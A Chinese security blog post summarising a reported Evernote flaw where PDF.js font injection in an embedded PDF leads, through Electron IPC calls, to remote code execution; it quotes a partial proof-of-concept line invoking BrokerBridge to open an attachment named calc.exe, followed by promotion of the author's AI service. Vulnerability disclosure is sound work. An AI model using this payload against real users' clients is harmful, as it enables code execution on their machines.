---
title: Evernote 应用中PDF.js字体注入导致跨平台远程代码执行漏洞
url: https://mp.weixin.qq.com/s?__biz=MzU0MDcyMTMxOQ==&mid=2247487332&idx=1&sn=71b33d61aa38bffd24ebc8ac825b419f&chksm=fb35a6accc422fba335f182f00cbee272bda30d7f6ffffb543c22fa3ac8eea0852d5e73bc6d0&scene=58&subscene=0#rd
source: 甲方安全建设
date: 2024-07-12
fetch_date: 2025-10-06T17:44:51.159597
---

# Evernote 应用中PDF.js字体注入导致跨平台远程代码执行漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyibhbKU7E6pn3GLlOMNtnbiaoEeudV3tyZicuSmD3lq7enRrE46dAbpn6g/0?wx_fmt=jpeg)

# Evernote 应用中PDF.js字体注入导致跨平台远程代码执行漏洞

原创

bggsec

甲方安全建设

## 前言

> 一句话总结(点击原文跳转)

主要描述了一个在Evernote应用中发现的关键性漏洞，该漏洞可以通过嵌入恶意PDF文件到笔记中，利用PDF.js的字体注入进行JavaScript代码执行，进而通过Electron的ipcRenderer和BrokerBridge实现跨进程通信，最终达到远程代码执行（RCE）的攻击链。

> 关键信息点

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyOC2NydInFzOIicJEOlk2cjgnbkdlqQu2fZl2RwcSnS2x7SSuqJXTojg/640?wx_fmt=png&from=appmsg)

```
//部分poc
window.top.electronApi.ipcRenderer.send('BrokerBridge', {action: 'Bridge/Call',id: '7e803824-d666-4ffe-9ebb-39ac1bd7856f',topics: 'boron.actions.openFileAttachment',data:{'resource': {'hash':'2f82623f9523c0d167862cad0eff6806','mime': 'application/octet-stream','rect': {'left': 68,'top': 155,'width': 728.1428833007812,'height': 43.42857360839844},'state': 'loaded','reference': '22cad1af-d431-4af6-b818-0e34f9ff150b','selected': true,'url': 'en-cache://tokenKey%3D%22AuthToken%3AUser%3A245946624%22+f4cbd0d2-f670-52a7-7ea7-5720d65614fd+2f82623f9523c0d167862cad0eff6806+https://www.evernote.com/shard/s708/res/54938bad-ecb2-3aaa-6ad0-a9b7958d402f','isInk': false,'filesize': 45056,'filename': 'calc.exe'},'url':'en-cache://tokenKey%3D%22AuthToken%3AUser%3A245946624%22+f4cbd0d2-f670-52a7-7ea7-5720d65614fd+2f82623f9523c0d167862cad0eff6806+https://www.evernote.com/shard/s708/res/54938bad-ecb2-3aaa-6ad0-a9b7958d402f','noteGuid': 'f4cbd0d2-f670-52a7-7ea7-5720d65614fd','appName': ''}})
```

> 某知名安全大V，昨日印象笔记被黑

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DynjEx8PW9cicEcNUawO9Hib7ETlRkB7luo8Ix8muek3EeG4paZU4LBMPw/640?wx_fmt=png&from=appmsg)

> 延伸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DybaODOiaLVTcD8wUumHCJ7DZnnCT4EjT3TGGUicSicK616ibSEbmebmWMcw/640?wx_fmt=png&from=appmsg)

> 最近的小玩意

* AI重构安全热点
* ![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyNUp02icA9baEZpASXH7LupChWE1dhlicc7dGU2WMt1BNiaPMcg7Tv0Z4A/640?wx_fmt=png&from=appmsg)
* Ai重构知识库+智能书签+导航

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyWGLFwfIgUdL5fVA6F33Eu0yic66ww0OczarsWtGoR3TLCNYVnXajCAg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyLaCfov9GGZA9cd6icIYuP5IKw4vs78vawr5Ex9T6p2KcDpuGLaGqmPw/640?wx_fmt=png&from=appmsg)

* 花费, 周均一亿多token

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyLoDJwXHiar1y4ibZjsxCMA43I7AU3MmgUMsy6eWyUdibY4VZ0ibVDsXAWw/640?wx_fmt=png&from=appmsg)

* 自动化输出方式(快讯星球+微博)

```
部分能力后期会开放，比如知识库/迪斯科等，星球身份应该是后期各服务的通行证
AI目前比较贵，为了可持续发展，设置了星球的地板价25元(系统最低价)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyssgvAvnnTufYJpqzek9hAYycEWzUP57qRkLa7Gf458C8E6PFf3khTg/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0Dyp64ZtycStwT7conLOibhhcQvhYuoapl9xPBCMP8icCbZvzvr222LJAng/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icqm3vRUymZkDzC5njrov9XMbdIJSl0Dy1FFdGtVj8hagUkBUP6NBSQFj0YN4hgDfRTegalIlckxxLNI4DXJFuA/640?wx_fmt=jpeg&from=appmsg)

* 沟通群(过期添加`red4blue`,备注加群)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyficsetRouXGwCnztEwb9kSNXUEtJmwdHTcojhqF7yiboxl2iaAMdFaGuw/640?wx_fmt=png&from=appmsg)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/icqm3vRUymZl2PzcJhVGmBDWwFv1InwmicGHiaKiaIHUjMldX298CyiazWE3MuBXqqC4jDgwIszbmSnUmxWdnWP7Tng/0?wx_fmt=png)

甲方安全建设

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/icqm3vRUymZl2PzcJhVGmBDWwFv1InwmicGHiaKiaIHUjMldX298CyiazWE3MuBXqqC4jDgwIszbmSnUmxWdnWP7Tng/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过